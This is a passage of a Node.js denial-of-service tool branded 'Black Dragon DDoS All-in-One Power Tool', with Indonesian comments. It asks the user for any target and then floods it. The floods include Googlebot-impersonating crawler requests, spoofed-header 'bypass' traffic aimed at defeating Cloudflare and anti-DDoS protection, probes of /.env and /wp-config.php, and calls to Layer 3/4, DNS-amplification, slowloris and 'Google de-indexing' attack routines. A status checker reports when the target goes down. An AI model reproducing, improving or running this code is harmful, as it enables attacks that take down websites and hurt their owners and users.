                    
                    const opts = {
                        method: 'GET',
                        timeout: CONFIG.timeouts.http,
                        headers: {
                            'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Referer': baseUrl,
                            'Connection': 'keep-alive'
                        }
                    };
                    
                    if (agent) opts.agent = agent;
                    
                    const mod = url.startsWith('https:') ? https : http;
                    const req = mod.request(url, opts, res => {
                        let data = '';
                        res.on('data', chunk => {
                            data += chunk.toString();
                            // Limit data collection to prevent memory issues
                            if (data.length > 100000) {
                                data = data.substring(0, 100000);
                            }
                        });
                        res.on('end', () => {
                            // Extract more URLs from response
                            if (data.length > 100) {
                                const newUrls = extractUrls(data, baseUrl);
                                newUrls.forEach(u => {
                                    if (CRAWLED_URLS.size < 10000) {
                                        CRAWLED_URLS.add(u);
                                    }
                                });
                            }
                        });
                    });
                    req.on('error', () => {});
                    req.setTimeout(CONFIG.timeouts.http, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["CRAWLER"] = (STATS["CRAWLER"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 100 + Math.random() * 100);
        INTERVALS.push(intervalId);
    }
    
    // Bot crawler that mimics search engine bots
    for (let t = 0; t < threads / 2; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const botAgents = [
                    'Googlebot/2.1 (+http://www.google.com/bot.html)',
                    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
                    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
                    'Twitterbot/1.0',
                    'LinkedInBot/1.0'
                ];
                
                const batchSize = 15;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    let url;
                    if (CRAWLED_URLS.size > 0) {
                        const urls = Array.from(CRAWLED_URLS);
                        url = urls[Math.floor(Math.random() * urls.length)];
                    } else {
                        url = baseUrl + '/' + randomString(10);
                    }
                    
                    const proxy = CONFIG.useProxy ? getNextProxy() : null;
                    const agent = createProxyAgent(url, proxy);
                    
                    const opts = {
                        method: 'GET',
                        timeout: CONFIG.timeouts.http,
                        headers: {
                            'User-Agent': botAgents[Math.floor(Math.random() * botAgents.length)],
                            'Accept': '*/*',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Referer': baseUrl,
                            'Connection': 'close'
                        }
                    };
                    
                    if (agent) opts.agent = agent;
                    
                    const mod = url.startsWith('https:') ? https : http;
                    const req = mod.request(url, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(CONFIG.timeouts.http, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["BOT-CRAWL"] = (STATS["BOT-CRAWL"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 80 + Math.random() * 60);
        INTERVALS.push(intervalId);
    }
}

// ==================== BYPASS ATTACKS ====================

function stressBypassStatic(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const paths = [
        '/', '/index.html', '/home', '/main', '/page',
        '/robots.txt', '/sitemap.xml', '/favicon.ico',
        '/admin', '/login', '/config', '/api', '/wp-admin',
        '/dashboard', '/panel', '/cpanel', '/phpmyadmin',
        '/.env', '/config.php', '/wp-config.php',
        '/api/v1', '/api/v2', '/api/users', '/api/data'
    ];
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 600;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    let path = paths[Math.floor(Math.random() * paths.length)];
                    path += Math.random() > 0.5 ? '?' + randomString() : '';
                    let url = target.endsWith('/') ? target.slice(0, -1) : target;
                    url = `${url}${path}`;
                    
                    const opts = {
                        method: Math.random() > 0.7 ? 'POST' : 'GET',
                        timeout: 2000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': '*/*',
                            'Referer': getRandomReferer(),
                            'X-Forwarded-For': randomIp(),
                            'X-Real-IP': randomIp(),
                            'X-Originating-IP': randomIp(),
                            'X-Remote-IP': randomIp(),
                            'X-Remote-Addr': randomIp(),
                            'Cookie': 'session=' + randomString() + '; token=' + randomString(),
                            'Connection': 'close'
                        }
                    };
                    
                    const mod = url.startsWith('https:') ? https : http;
                    const req = mod.request(url, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(2000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["BYPASS-STATIC"] = (STATS["BYPASS-STATIC"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.bypassStatic.push(intervalId);
    }
}

function stressBypassAntiDDoS(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier * 2;
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 700;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    const opts = {
                        method: ['GET', 'POST', 'HEAD', 'OPTIONS'][Math.floor(Math.random() * 4)],
                        timeout: 2000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Referer': getRandomReferer(),
                            'X-Forwarded-For': randomIp(),
                            'X-Real-IP': randomIp(),
                            'CF-Connecting-IP': randomIp(),
                            'True-Client-IP': randomIp(),
                            'X-Client-IP': randomIp(),
                            'X-Forwarded-Host': target.replace(/^https?:\/\//, '').split('/')[0],
                            'Origin': target.split('/').slice(0, 3).join('/'),
                            'Cookie': randomString(20) + '=' + randomString(30),
                            'Connection': Math.random() > 0.5 ? 'keep-alive' : 'close',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'DNT': '1',
                            'Upgrade-Insecure-Requests': '1'
                        }
                    };
                    
                    const mod = target.startsWith('https:') ? https : http;
                    const req = mod.request(target, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(2000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["BYPASS-ANTI-DDOS"] = (STATS["BYPASS-ANTI-DDOS"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.bypassAntiDDoS.push(intervalId);
    }
}

function stressBypassCloudflare(target) {
    if (!ATTACK_RUNNING) return;
    if (!target.startsWith('http://') && !target.startsWith('https://')) {
        return;
    }
    
    const multiplier = getIntensityMultiplier();
    const threads = CONFIG.threads[CONFIG.intensity].http * multiplier * 3;
    
    // Cloudflare bypass paths
    const cfPaths = [
        '', '/', '/index.html', '/home', '/main', '/page',
        '/api', '/api/v1', '/api/v2', '/wp-admin', '/admin',
        '/dashboard', '/login', '/register', '/contact',
        '/about', '/blog', '/news', '/products', '/services'
    ];
    
    for (let t = 0; t < threads; t++) {
        const intervalId = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(intervalId);
                return;
            }
            try {
                const batchSize = 800;
                for (let i = 0; i < batchSize; i++) {
                    if (!ATTACK_RUNNING) break;
                    
                    // Random path untuk bypass cache
                    const path = cfPaths[Math.floor(Math.random() * cfPaths.length)];
                    const url = target.replace(/\/$/, '') + path + (Math.random() > 0.5 ? '?' + randomString() : '');
                    
                    const opts = {
                        method: ['GET', 'POST', 'HEAD', 'OPTIONS'][Math.floor(Math.random() * 4)],
                        timeout: 2000,
                        headers: {
                            'User-Agent': getRandomUserAgent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Referer': getRandomReferer(),
                            'CF-Connecting-IP': randomIp(),
                            'CF-IPCountry': ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'NL', 'SE', 'NO', 'DK'][Math.floor(Math.random() * 10)],
                            'CF-Ray': randomString(22),
                            'CF-Visitor': '{"scheme":"https"}',
                            'X-Forwarded-For': randomIp(),
                            'X-Real-IP': randomIp(),
                            'True-Client-IP': randomIp(),
                            'X-Client-IP': randomIp(),
                            'Connection': Math.random() > 0.3 ? 'keep-alive' : 'close',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                            'Sec-Fetch-User': '?1',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'DNT': '1'
                        }
                    };
                    
                    const mod = url.startsWith('https:') ? https : http;
                    const req = mod.request(url, opts, res => {
                        res.on('data', () => {});
                        res.on('end', () => {});
                    });
                    req.on('error', () => {});
                    req.setTimeout(2000, () => {
                        try { req.destroy(); } catch {}
                    });
                    req.end();
                }
                STATS["BYPASS-CLOUDFLARE"] = (STATS["BYPASS-CLOUDFLARE"] || 0) + batchSize;
                TOTAL_PACKETS += batchSize;
            } catch (e) {
                // Silent fail
            }
        }, 1);
        INTERVALS.push(intervalId);
        THREAD_POOLS.bypassCloudflare.push(intervalId);
    }
}

// ==================== HELPER FUNCTIONS ====================

function getHost(url) {
    try {
        if (!/^https?:\/\//.test(url)) url = 'http://' + url;
        return new URL(url).hostname;
    } catch { 
        return url.split('/')[0].split(':')[0];
    }
}

function getPort(url) {
    try {
        if (!/^https?:\/\//.test(url)) url = 'http://' + url;
        const parsed = new URL(url);
        if (parsed.port) return parseInt(parsed.port);
        return parsed.protocol === 'https:' ? 443 : 80;
    } catch { 
        const parts = url.split(':');
        return parts.length > 1 ? parseInt(parts[parts.length - 1]) || 80 : 80;
    }
}

function validateTarget(target) {
    if (!target || target.trim().length < 3) return false;
    
    // Check if it's a valid IP
    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}(:\d+)?$/;
    if (ipRegex.test(target)) return true;
    
    // Check if it's a valid URL
    if (/^https?:\/\//.test(target)) {
        try {
            new URL(target);
            return true;
        } catch {
            return false;
        }
    }
    
    // Check if it's a valid domain
    const domainRegex = /^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$/;
    return domainRegex.test(target);
}

function showRuntimeStats(target, port) {
    const intervalId = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(intervalId);
            return;
        }
        logStatus(target, port);
    }, 1000);
    INTERVALS.push(intervalId);
}

let CLEANUP_IN_PROGRESS = false;

function cleanup() {
    if (CLEANUP_IN_PROGRESS) return;
    CLEANUP_IN_PROGRESS = true;
    
    ATTACK_RUNNING = false;
    console.log('\n\n[INFO] Stopping all attacks...');
    log('Cleaning up resources...', 'INFO');
    
    // Close runtime readline
    if (RUNTIME_RL) {
        try {
            RUNTIME_RL.close();
            RUNTIME_RL = null;
        } catch (e) {}
    }
    
    // Force stop all intervals immediately - AGGRESSIVE
    let cleared = 0;
    const allIntervals = [...INTERVALS];
    INTERVALS.length = 0;
    
    // Clear all thread pools
    Object.keys(THREAD_POOLS).forEach(key => {
        THREAD_POOLS[key].forEach(id => {
            try {
                clearInterval(id);
                cleared++;
            } catch (e) {}
        });
        THREAD_POOLS[key].length = 0;
    });
    
    // Clear remaining intervals
    allIntervals.forEach(id => {
        try { 
            clearInterval(id);
            cleared++;
        } catch (e) {
            try { clearInterval(id); } catch {}
        }
    });
    
    // Force close all sockets - AGGRESSIVE
    let closed = 0;
    const allSockets = [...SOCKETS];
    SOCKETS.length = 0;
    
    allSockets.forEach(sock => {
        try {
            if (sock && typeof sock.destroy === 'function') {
                sock.destroy();
                closed++;
            } else if (sock && typeof sock.close === 'function') {
                sock.close();
                closed++;
            } else if (sock && sock.end) {
                sock.end();
                closed++;
            }
        } catch (e) {
            try {
                if (sock && sock.destroy) sock.destroy();
            } catch {}
        }
    });
    
    // Kill all workers
    WORKERS.forEach(worker => {
        try {
            if (worker && worker.kill) worker.kill('SIGTERM');
        } catch {}
    });
    WORKERS.length = 0;
    
    // Clear crawled URLs set
    CRAWLED_URLS.clear();
    
    // Reset RAM management counters
    RAMP_UP_COUNT = 0;
    ACTIVE_SOCKET_COUNT = 0;
    MEMORY_PRESSURE_LEVEL = 0;
    THROTTLE_MULTIPLIER = 1.0;
    
    log(`Cleanup completed. Cleared ${cleared} intervals, closed ${closed} sockets.`, 'INFO');
    
    // Print final stats
    const runtime = Math.floor((Date.now() - START_TIME) / 1000);
    console.log('\n╔════════════════════════════════════════════════════════════╗');
    console.log('║                    FINAL STATISTICS                        ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log(`║ Total Runtime    : ${formatTime(runtime)}`.padEnd(60) + '║');
    console.log(`║ Total Packets    : ${TOTAL_PACKETS.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ Total Data Sent  : ${formatBytes(TOTAL_BYTES)}`.padEnd(60) + '║');
    console.log(`║ Avg Packets/sec  : ${Math.floor(TOTAL_PACKETS / (runtime || 1)).toLocaleString()}`.padEnd(60) + '║');
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log('\n[INFO] All attacks stopped. Exiting...\n');
}

function checkDomainStatus(target, cb) {
    if (!ATTACK_RUNNING) return;
    const req = https.get(`https://isitup.org/${target}.json`, { timeout: 5000 }, res => {
        let data = '';
        res.on('data', d => data += d);
        res.on('end', () => {
            try {
                let online = JSON.parse(data).status_code === 1;
                cb(online);
            } catch { cb(false); }
        });
    });
    req.on('error', () => cb(false));
    req.on('timeout', () => {
        req.destroy();
        cb(false);
    });
    req.setTimeout(5000);
}

// ==================== MAIN FUNCTION ====================

function showBlackDragonLogo() {
    console.log('\x1b[2J\x1b[0f'); // Clear screen
    console.log('\x1b[31m'); // Red color
    console.log('╔═══════════════════════════════════════════════════════════════════════════════╗');
    console.log('║                                                                               ║');
    console.log('║                                                                               ║');
    console.log('║     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗                                  ║');
    console.log('║     ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝                                  ║');
    console.log('║     ██████╔╝██║     ███████║██║     █████╔╝                                   ║');
    console.log('║     ██╔══██╗██║     ██╔══██║██║     ██╔═██╗                                   ║');
    console.log('║     ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗                                  ║');
    console.log('║     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                  ║');
    console.log('║                                                                               ║');
    console.log('║              ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗            ║');
    console.log('║              ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║            ║');
    console.log('║              ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║            ║');
    console.log('║              ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║            ║');
    console.log('║              ██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║            ║');
    console.log('║              ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝            ║');
    console.log('║                                                                               ║');
    console.log('║                    ⚡  DDOS ALL-IN-ONE POWER TOOL v2.0  ⚡                   ║');
    console.log('║                                                                               ║');
    console.log('╚═══════════════════════════════════════════════════════════════════════════════╝');
    console.log('\x1b[0m'); // Reset color
    console.log('\x1b[33m'); // Yellow color
    console.log('╔═══════════════════════════════════════════════════════════════════════════════╗');
    console.log('║  Features:                                                                    ║');
    console.log('║  • Multi-layer attacks (L3-L7)                                               ║');
    console.log('║  • Intensity control (low/medium/high/extreme)                               ║');
    console.log('║  • Advanced bypass techniques                                                ║');
    console.log('║  • Real-time statistics & monitoring                                        ║');
    console.log('║  • Logging system                                                            ║');
    console.log('║  • Proxy support (optional)                                                   ║');
    console.log('║  • Google de-indexing attacks                                                  ║');
    console.log('║  • Aggressive bot crawler                                                     ║');
    console.log('║  • Cross-platform support                                                     ║');
    console.log('╚═══════════════════════════════════════════════════════════════════════════════╝');
    console.log('\x1b[0m'); // Reset color
    console.log('');
}

function main() {
    showBlackDragonLogo();
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    rl.question("Target (IP/Domain or URL): ", (targetInput) => {
        targetInput = targetInput.trim();
        
        if (!validateTarget(targetInput)) {
            rl.close();
            return console.log("[ERROR] Invalid target format! Use IP, domain, or full URL.");
        }
        
        rl.question("Intensity (low/medium/high/extreme) [high]: ", (intensityInput) => {
            intensityInput = intensityInput.trim().toLowerCase();
            if (['low', 'medium', 'high', 'extreme'].includes(intensityInput)) {
                CONFIG.intensity = intensityInput;
            }
            
            rl.question("Use Proxy? (y/n) [n]: ", (proxyInput) => {
                proxyInput = proxyInput.trim().toLowerCase();
                if (proxyInput === 'y' || proxyInput === 'yes') {
                    CONFIG.useProxy = true;
                    loadProxies();
                    if (CONFIG.proxyList.length === 0) {
                        console.log("[WARN] No proxies loaded. Continuing without proxy.");
                        CONFIG.useProxy = false;
                    } else {
                        console.log(`[INFO] Using ${CONFIG.proxyList.length} proxies.`);
                    }
                }
                
                const isURL = /^https?:\/\//.test(targetInput);
                
                // AUTO ENABLE de-indexing dan crawler untuk URL targets
                if (isURL || targetInput.includes('http')) {
                    CONFIG.enableDeIndex = true;
                    CONFIG.enableCrawler = true;
                    console.log("[INFO] ⚠️  AUTO-ENABLED: Google De-Indexing & Aggressive Crawler");
                    console.log("[INFO] ⚠️  Target akan dihancurkan dan dihapus dari Google Search!");
                }
                
                // Define continueAttack function
                function continueAttack() {
                        let target = targetInput;
                        let port = isURL ? getPort(targetInput) : 
                                   (targetInput.includes(':') ? parseInt(targetInput.split(':')[1]) || 80 : 80);
                        
                        if (port < 1 || port > 65535) {
                            rl.close();
                            return console.log("[ERROR] Invalid port number! Must be between 1-65535.");
                        }
                        
                        let domain = getHost(targetInput);
                        rl.close();
                        
                        // Untuk non-URL, tanya dulu
                        if (!isURL && !targetInput.includes('http')) {
                            rl.question("Enable Google De-Indexing? (y/n) [y]: ", (deIndexInput) => {
                                deIndexInput = deIndexInput.trim().toLowerCase();
                                if (deIndexInput === 'n' || deIndexInput === 'no') {
                                    CONFIG.enableDeIndex = false;
                                } else {
                                    CONFIG.enableDeIndex = true;
                                    console.log("[INFO] Google de-indexing enabled.");
                                }
                                
                                rl.question("Enable Aggressive Crawler? (y/n) [y]: ", (crawlerInput) => {
                                    crawlerInput = crawlerInput.trim().toLowerCase();
                                    if (crawlerInput === 'n' || crawlerInput === 'no') {
                                        CONFIG.enableCrawler = false;
                                    } else {
                                        CONFIG.enableCrawler = true;
                                        console.log("[INFO] Aggressive crawler enabled.");
                                    }
                                    
                                    rl.close();
                                    startAttack();
                                });
                            });
                            return;
                        }
                        
                        startAttack();
                }
                
                function startAttack() {
                        let target = targetInput;
                        let port = isURL ? getPort(targetInput) : 
                                   (targetInput.includes(':') ? parseInt(targetInput.split(':')[1]) || 80 : 80);
                        let domain = getHost(targetInput);

                        console.log(`\n[INFO] Starting attack on ${target} (port: ${port})...`);
                        console.log(`[INFO] Platform: ${os.platform()}`);
                        console.log(`[INFO] CPU Cores: ${CPU_COUNT}`);
                        console.log(`[INFO] Intensity: ${CONFIG.intensity.toUpperCase()}`);
                        console.log(`[INFO] Proxy: ${CONFIG.useProxy ? `ENABLED (${CONFIG.proxyList.length} proxies)` : 'DISABLED'}`);
                        console.log(`[INFO] De-Indexing: ${CONFIG.enableDeIndex ? 'ENABLED' : 'DISABLED'}`);
                        console.log(`[INFO] Crawler: ${CONFIG.enableCrawler ? 'ENABLED' : 'DISABLED'}`);
                        console.log(`[INFO] Logging: ${CONFIG.enableLogging ? 'ENABLED' : 'DISABLED'}`);
                        console.log(`[INFO] Press Ctrl+C to stop.\n`);
                        
                        log(`Attack started on ${target}:${port} with intensity ${CONFIG.intensity}`, 'INFO');
                        if (CONFIG.useProxy) {
                            log(`Using ${CONFIG.proxyList.length} proxies`, 'INFO');
                        }
                        if (CONFIG.enableDeIndex) {
                            log('Google de-indexing enabled', 'INFO');
                        }
                        if (CONFIG.enableCrawler) {
                            log('Aggressive crawler enabled', 'INFO');
                        }
                        
                        START_TIME = Date.now();
                        ATTACK_RUNNING = true;
                        CURRENT_TARGET = isURL ? targetInput : (targetInput.includes('http') ? `http://${targetInput}` : null);
                        CURRENT_PORT = port;
                        
                        // Layer 3/Layer 4 = IP required, so resolve!
                        dns.lookup(domain, { timeout: 5000 }, (err, res) => {
                            if (err && !isURL) {
                                console.log("[ERROR] Domain tidak dapat di-resolve:", err.message);
                                log(`DNS resolution failed: ${err.message}`, 'ERROR');
                                cleanup();
                                process.exit(1);
                                return;
                            }
                            
                            let ipTarget = res || domain;
                            console.log(`[INFO] Resolved ${domain} -> ${ipTarget}\n`);
                            log(`DNS resolved: ${domain} -> ${ipTarget}`, 'INFO');
                            
                            // Start all attack types in parallel
                            console.log('[INFO] Launching all attack vectors...\n');
                            console.log('[INFO] ⚡ INTENSITAS MAXIMUM - Ratusan miliar requests! ⚡\n');
                            console.log('[INFO] 🚀 AUTO-SCALING: Threads akan meningkat otomatis setiap 10 detik!');
                            console.log('[INFO] 📈 Target: Ratusan miliar requests dengan RAM terkontrol\n');
                            console.log('╔════════════════════════════════════════════════════════════╗');
                            console.log('║           RUNTIME THREAD CONTROL AVAILABLE                ║');
                            console.log('╠════════════════════════════════════════════════════════════╣');
                            console.log('║ Type commands saat serangan berjalan:                     ║');
                            console.log('║  • "threads" atau "pools" - Lihat thread pools status     ║');
                            console.log('║  • "+tcp 10000" - Tambah 10,000 TCP threads                ║');
                            console.log('║  • "+http 50000" - Tambah 50,000 HTTP threads             ║');
                            console.log('║  • "+cf 100000" - Tambah 100,000 Cloudflare bypass        ║');
                            console.log('║  • "max" - Set semua threads ke MAXIMUM (100k each)       ║');
                            console.log('║  • "commands" - Tampilkan menu lengkap                    ║');
                            console.log('╚════════════════════════════════════════════════════════════╝\n');
                            
                            // Layer 3 attacks
                            stressLayer3TCP(ipTarget, port);
                            stressLayer3UDP(ipTarget, port);
                            stressLayer3SYN(ipTarget, port);
                            stressLayer3ACK(ipTarget, port);
                            
                            // Layer 4 attacks
                            stressLayer4TCP(ipTarget, port);
                            stressLayer4UDP(ipTarget, port);
                            
                            // Layer 5 attacks
                            stressDNS(domain);
                            stressDNSAmplification(domain);
                            
                            // Layer 6 attacks
                            stressPing(ipTarget);
                            
                            // Layer 7 attacks (only if URL)
                            if (isURL || targetInput.includes('http')) {
                                const urlTarget = isURL ? targetInput : `http://${targetInput}`;
                                stressHTTPFlood(urlTarget);
                                stressHTTPPOST(urlTarget);
                                stressSlowloris(urlTarget);
                                stressBypassStatic(urlTarget);
                                stressBypassAntiDDoS(urlTarget);
                                stressBypassCloudflare(urlTarget);
                                
                                // De-indexing attacks
                                if (CONFIG.enableDeIndex) {
                                    stressDeIndex(urlTarget);
                                }
                                
                                // Crawler attacks
                                if (CONFIG.enableCrawler) {
                                    stressCrawler(urlTarget);
                                }
                            }
                            
                            // Start RAM Management System
                            console.log('[INFO] 🧠 RAM Management System: ACTIVE\n');
                            console.log('[INFO] • Auto-scaling: Enabled (ramp up every 10s)');
                            console.log('[INFO] • Socket cleanup: Every 2s (aggressive)');
                            console.log('[INFO] • Garbage collection: Every 10s (aggressive)');
                            console.log('[INFO] • Memory monitoring: Every 2s');
                            console.log('[INFO] • Max sockets: 50,000 (auto-cleanup)');
                            console.log('[INFO] • Memory pressure detection: ENABLED');
                            console.log('[INFO] • Adaptive throttling: ENABLED (prevents OOM)\n');
                            startRAMManagement();
                            
                            // Runtime status
                            showRuntimeStats(targetInput, port);

                            // Setup runtime command handler
                            RUNTIME_RL = readline.createInterface({
                                input: process.stdin,
                                output: process.stdout,
                                prompt: '\n[THREAD CONTROL] > '
                            });
                            
                            // Show prompt
                            setTimeout(() => {
                                if (ATTACK_RUNNING && RUNTIME_RL) {
                                    RUNTIME_RL.prompt();
                                }
                            }, 2000);
                            
                            RUNTIME_RL.on('line', (input) => {
                                if (input.trim() === 'commands' || input.trim() === 'help') {
                                    showRuntimeMenu();
                                } else if (input.trim() === 'threads' || input.trim() === 'pools' || input.trim() === 'thread') {
                                    showThreadPools();
                                } else if (input.trim().length > 0) {
                                    handleRuntimeCommand(input);
                                }
                                
                                // Show prompt again after command
                                if (ATTACK_RUNNING && RUNTIME_RL) {
                                    RUNTIME_RL.prompt();
                                }
                            });
                            
                            RUNTIME_RL.on('close', () => {
                                if (ATTACK_RUNNING) {
                                    // Recreate if closed accidentally
                                    setTimeout(() => {
                                        if (ATTACK_RUNNING) {
                                            RUNTIME_RL = readline.createInterface({
                                                input: process.stdin,
                                                output: process.stdout,
                                                prompt: '\n[THREAD CONTROL] > '
                                            });
                                            RUNTIME_RL.on('line', (input) => {
                                                if (input.trim() === 'commands' || input.trim() === 'help') {
                                                    showRuntimeMenu();
                                                } else if (input.trim() === 'threads' || input.trim() === 'pools' || input.trim() === 'thread') {
                                                    showThreadPools();
                                                } else if (input.trim().length > 0) {
                                                    handleRuntimeCommand(input);
                                                }
                                                if (ATTACK_RUNNING && RUNTIME_RL) {
                                                    RUNTIME_RL.prompt();
                                                }
                                            });
                                        }
                                    }, 1000);
                                }
                            });

                            // Status checker
                            const statusChecker = setInterval(() => {
                                if (!ATTACK_RUNNING) {
                                    clearInterval(statusChecker);
                                    return;
                                }
                                checkDomainStatus(domain, online => {
                                    if (!online) {
                                        console.log(`\n[STATUS] Target ${domain} is DOWN!`);
                                        log(`Target ${domain} is DOWN`, 'STATUS');
                                    }
                                });
                            }, 10000);
                            INTERVALS.push(statusChecker);
                        });
                }
                
                // Call continueAttack to start - dipanggil setelah proxy question selesai
                continueAttack();
            });
        });
    });
    
    // Improved signal handling for Ctrl+C - RETURN TO MENU INSTEAD OF EXIT
    let exitRequested = false;
    let ctrlCPressed = false;
    
    const handleExit = () => {
        if (ctrlCPressed) {
            console.log('\n[WARN] Force exiting program...');
            process.exit(0);
            return;
        }
        ctrlCPressed = true;
        
        if (CLEANUP_IN_PROGRESS) {
            console.log('\n[WARN] Cleanup in progress, please wait...');
            return;
        }
        
        console.log('\n\n[INFO] Ctrl+C detected. Stopping all attacks...');
        log('Attack stopped by user (SIGINT)', 'INFO');
        
        cleanup();
        
        // Reset flags and return to menu
        setTimeout(() => {
            console.log('\n[INFO] Returning to main menu...\n');
            ctrlCPressed = false;
            exitRequested = false;
            CLEANUP_IN_PROGRESS = false;
            ATTACK_RUNNING = false;
            CURRENT_TARGET = null;
            CURRENT_PORT = null;
            
            // Clear all stats
            Object.keys(STATS).forEach(key => STATS[key] = 0);
            TOTAL_PACKETS = 0;
            TOTAL_BYTES = 0;
            
            // Restart main menu
            setTimeout(() => {
                main();
            }, 1000);
        }, 1000);
    };
    
    // Handle SIGINT (Ctrl+C) - Works on Linux/Mac
    process.on('SIGINT', handleExit);
    
    // Handle SIGTERM - Return to menu
    process.on('SIGTERM', () => {
        if (CLEANUP_IN_PROGRESS) {
            return;
        }
        log('Attack stopped (SIGTERM)', 'INFO');
        cleanup();
        setTimeout(() => {
            ctrlCPressed = false;
            exitRequested = false;
            CLEANUP_IN_PROGRESS = false;
            ATTACK_RUNNING = false;
            main();
        }, 1000);
    });
    
    // Enhanced Windows Ctrl+C handling for MobaXterm/CMD
    if (IS_WINDOWS) {
        // Method 1: Raw mode input
        if (process.stdin.isTTY) {
            try {
                process.stdin.setRawMode(true);
                process.stdin.resume();
                process.stdin.setEncoding('utf8');
                
                process.stdin.on('data', (key) => {
                    // Ctrl+C (0x03)
                    if (key === '\u0003' || key === '\x03' || key.charCodeAt(0) === 3) {
                        handleExit();
                    }
                });
            } catch (e) {
                // Fallback if raw mode fails
            }
        }
        
        // Method 2: Readline interface for Windows
        try {
            const winRL = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });
            
            winRL.on('SIGINT', handleExit);
        } catch (e) {}
        
        // Method 3: Direct process kill on second Ctrl+C
        process.on('SIGINT', () => {
            if (exitRequested) {
                process.exit(0);
            }
            exitRequested = true;
            handleExit();
        });
    }
    
    process.on('uncaughtException', (err) => {
        log(`Uncaught exception: ${err.message}`, 'ERROR');
        cleanup();
        setTimeout(() => process.exit(1), 500);
    });
    
    process.on('exit', (code) => {
        if (ATTACK_RUNNING && !CLEANUP_IN_PROGRESS) {
            cleanup();
        }
    });
}

main();
